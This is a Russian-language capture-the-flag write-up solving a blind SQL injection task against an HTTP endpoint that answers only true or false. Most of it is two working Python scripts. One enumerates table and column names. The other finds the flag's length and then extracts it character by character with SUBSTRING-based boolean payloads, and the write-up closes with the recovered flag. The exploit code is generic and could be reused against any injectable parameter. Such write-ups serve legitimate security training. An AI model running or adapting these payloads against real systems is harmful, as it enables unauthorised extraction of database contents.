## Описание

Флаг находится в таблице БД, но запрос к ней может ответить только false или true.

Адрес api: http://31.207.77.216:4004/check?number=1

## Решение

Задача на слепую SQL инъекцию:

Проверяем имена таблиц:

```
import requests

url = "http://31.207.77.216:4004/check"

def check(payload):
    full_url = f"{url}?number=1 AND {payload}"
    response = requests.get(full_url)
    return "true" in response.text.lower()

# Попробуем разные имена таблиц
table_names = ["flags", "flag", "secret", "secrets", "data", "info", "ctf", "flag_table"]
column_names = ["flag", "value", "text", "data", "secret", "content"]

for table in table_names:
    for column in column_names:
        # Проверяем существование таблицы и столбца
        payload = f"EXISTS(SELECT 1 FROM {table} WHERE {column} IS NOT NULL)"
        if check(payload):
            print(f"✅ Найдена таблица: {table}, столбец: {column}")
```

Посимвольно достаем флаг:

```
import requests
import string

url = "http://31.207.77.216:4004/check"


def check(payload):
    """Проверяет, возвращает ли payload true"""
    full_url = f"{url}?number=1 AND {payload}"
    response = requests.get(full_url)
    return "true" in response.text.lower()


def get_flag_length():
    """Определяет длину флага"""
    print("Определяем длину флага...")
    for length in range(1, 100):
        payload = f"(SELECT LENGTH(flag) FROM flag LIMIT 1) = {length}"
        if check(payload):
            print(f"Длина флага: {length}")
            return length

    # Попробуем бинарный поиск для длины
    print("Пробуем бинарный поиск для длины...")
    low, high = 1, 100
    while low <= high:
        mid = (low + high) // 2
        payload = f"(SELECT LENGTH(flag) FROM flag LIMIT 1) > {mid}"
        if check(payload):
            low = mid + 1
        else:
            payload2 = f"(SELECT LENGTH(flag) FROM flag LIMIT 1) = {mid}"
            if check(payload2):
                print(f"Длина флага: {mid}")
                return mid
            high = mid - 1
    return None


def get_flag():
    """Извлекает флаг посимвольно"""
    flag_length = get_flag_length()
    if not flag_length:
        print("Не удалось определить длину флага")
        return None

    flag = ""
    # Расширенный набор символов для флага
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_{}!@#$%^&*()-=+"

    print("Извлекаем флаг...")
    for position in range(1, flag_length + 1):
        for char in charset:
            # Пробуем каждый символ на текущей позиции
            payload = f"(SELECT SUBSTRING(flag,{position},1) FROM flag LIMIT 1) = '{char}'"
            if check(payload):
                flag += char
                print(f"Позиция {position}/{flag_length}: '{char}' -> Текущий флаг: {flag}")
                break
        else:
            print(f"⚠️ Не удалось найти символ на позиции {position}")
            flag += "?"

    return flag


# Запускаем
print("Начинаем извлечение флага...")
flag = get_flag()
if flag:
    print(f"🎉 Флаг: {flag}")
else:
    print("Не удалось извлечь флаг")
```

```
BugCTF{sqlmap_testing_sql_injection}
```
